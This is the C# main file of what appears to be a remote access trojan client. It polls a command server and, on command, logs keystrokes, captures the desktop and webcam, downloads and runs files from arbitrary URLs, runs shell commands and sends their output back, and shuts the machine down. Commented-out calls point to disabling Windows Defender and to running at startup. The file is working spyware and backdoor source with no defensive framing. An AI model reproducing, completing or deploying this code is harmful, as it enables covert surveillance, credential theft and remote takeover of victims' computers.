using System;
using System.ComponentModel;
using System.Net;
using System.Runtime.InteropServices;

namespace stub
{
    internal class Program
    {

        public static class InputTimer
        {
            public static TimeSpan GetInputIdleTime()
            {
                int precision = 0;
                const int TIMESPAN_SIZE = 0;
                int factor = (int)Math.Pow(10, TIMESPAN_SIZE - precision);
                
                var plii = new NativeMethods.LastInputInfo();
                plii.cbSize = (UInt32)Marshal.SizeOf(plii);

                if (NativeMethods.GetLastInputInfo(ref plii))
                {
                    return TimeSpan.FromMilliseconds((long)Math.Round(1.0*(Environment.TickCount - plii.dwTime)/factor)*factor);

                }
                else
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
            }

            public static DateTimeOffset GetLastInputTime()
            {
                return DateTimeOffset.Now.Subtract(GetInputIdleTime());
            }

            private static class NativeMethods
            {
                public struct LastInputInfo
                {
                    public UInt32 cbSize;
                    public UInt32 dwTime;
                }

                [DllImport("user32.dll")]
                public static extern bool GetLastInputInfo(ref LastInputInfo plii);
            }
        }

        
        static void Main(string[] args)
        {
            
            MutexHandler.createMutex();
            
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);

            WebClientHandler.initwebClient();
            //ClientAdder.runAtStartup();
            ClientKeylogger.initClientKeylogger();
            ClientDesktop.initClientDesktop();
            //DisableDefender.initdisable();
            //AntiProcess.StartAntiProcess();

            WebClient webclient = WebClientHandler.wcReturn();
            
            while (true)
            {
                
                System.Threading.Thread.Sleep(2000);

                string name = Dns.GetHostName();
                string cmdFromServer = "";

                try
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webclient.UploadString("http://127.0.0.1/idle.php", "client=" + name + "&idleTime=" + InputTimer.GetInputIdleTime().ToString());
                }
                catch { }
                try
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    cmdFromServer = webclient.UploadString("http://127.0.0.1/getServerCommands.php", "client=" + name);
                }
                catch { }
                

                if (cmdFromServer.Contains("nocmd" +
                    "")) continue;
                else if (cmdFromServer.Contains("startkeylog"))
                {
                    ClientKeylogger.StartKeylogger();
                }
                else if (cmdFromServer.Contains("stopkeylog"))
                {
                    ClientKeylogger.StopKeylogger();
                }
                else if (cmdFromServer.Contains("startdc"))
                {
                    ClientDesktop.StartDesktopCapture();
                }
                else if (cmdFromServer.Contains("stopdc"))
                {
                    ClientDesktop.StopDesktopCapture();
                }
                else if (cmdFromServer.Contains("getpclist"))
                {
                    GetProcessList.FetchProcess();
                }
                else if (cmdFromServer.StartsWith("http"))
                {
                    DownloadExecute.dlHandler(cmdFromServer);
                }
                else if (cmdFromServer.Contains("uninstall"))
                {
                    UninstallHandler.uninstall(cmdFromServer);
                }
                else if (cmdFromServer.Contains("uninstall stop"))
                {
                    UninstallHandler.uninstall(cmdFromServer);
                }
                else if (cmdFromServer.Contains("shutdown"))
                {
                    ShutdownHandler.shutdown(cmdFromServer);
                }
                else if (cmdFromServer.Contains("anti start"))
                {
                    AntiProcess.StartAntiProcess();
                }
                else if (cmdFromServer.Contains("anti stop"))
                {
                    AntiProcess.StopAntiProcess();
                }
                else if (cmdFromServer.Contains("webcam"))
                {
                    WebcamHandler.StartWebcamCapture();
                }
                else
                {
                    string retString = Commands.Run(cmdFromServer);
                    try
                    {
                        webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webclient.UploadString("http://127.0.0.1/retString.php", "client=" + name + "&retstr=" + retString);
                    }
                    catch { }
                }



            }

        }

        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            WebClient webclient = WebClientHandler.wcReturn();

            try
            {
                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                webclient.UploadString("http://127.0.0.1/idle.php", "client=" + Dns.GetHostName() + "&idleTime=" + "Offline");
            }
            catch { }
        }
    }

}